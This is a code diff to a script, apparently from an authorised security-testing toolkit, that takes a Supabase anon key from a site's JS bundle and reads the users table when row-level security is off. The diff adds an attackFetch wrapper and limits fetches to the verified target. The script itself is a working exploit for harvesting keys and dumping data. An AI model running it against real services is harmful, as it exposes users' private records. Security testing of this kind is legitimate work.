@@ -1,19 +1,20 @@
 // Supabase RLS disabled: use the anon key that ships in the browser bundle to read whole tables.
-import { banner, requireVerifiedTarget } from "./_lib.ts";
+import { attackFetch, banner, requireVerifiedTarget } from "./_lib.ts";
 
 const origin = requireVerifiedTarget();
 banner("leak-supabase", origin);
 
 // Step 1: recover the anon key the way an attacker would — grep it out of the shipped JS bundle.
 async function anonKeyFromBundle(): Promise<string | null> {
-  const html = await fetch(`${origin}/`).then((r) => r.text());
+  const html = await attackFetch(`${origin}/`).then((r) => r.text());
   const scripts = [...html.matchAll(/src="([^"]+\.js)"/g)].map((m) => m[1]);
   // The homepage HTML itself may also inline the key; check it plus each script chunk.
   const sources = [html];
   for (const s of scripts.slice(0, 40)) {
     const url = s.startsWith("http") ? s : `${origin}${s}`;
+    if (!url.startsWith(origin)) continue; // only ever fetch from the verified target, never a third-party host
     try {
-      sources.push(await fetch(url).then((r) => r.text()));
+      sources.push(await attackFetch(url).then((r) => r.text()));
     } catch {
       /* ignore */
     }
@@ -34,7 +35,7 @@ if (!key) {
   console.log(`Recovered anon key from the JS bundle: ${key.slice(0, 4)}…`);
 }
 
-const res = await fetch(`${origin}/supabase/rest/v1/users`, {
+const res = await attackFetch(`${origin}/supabase/rest/v1/users`, {
   headers: { apikey: key, Authorization: `Bearer ${key}` },
 });
 
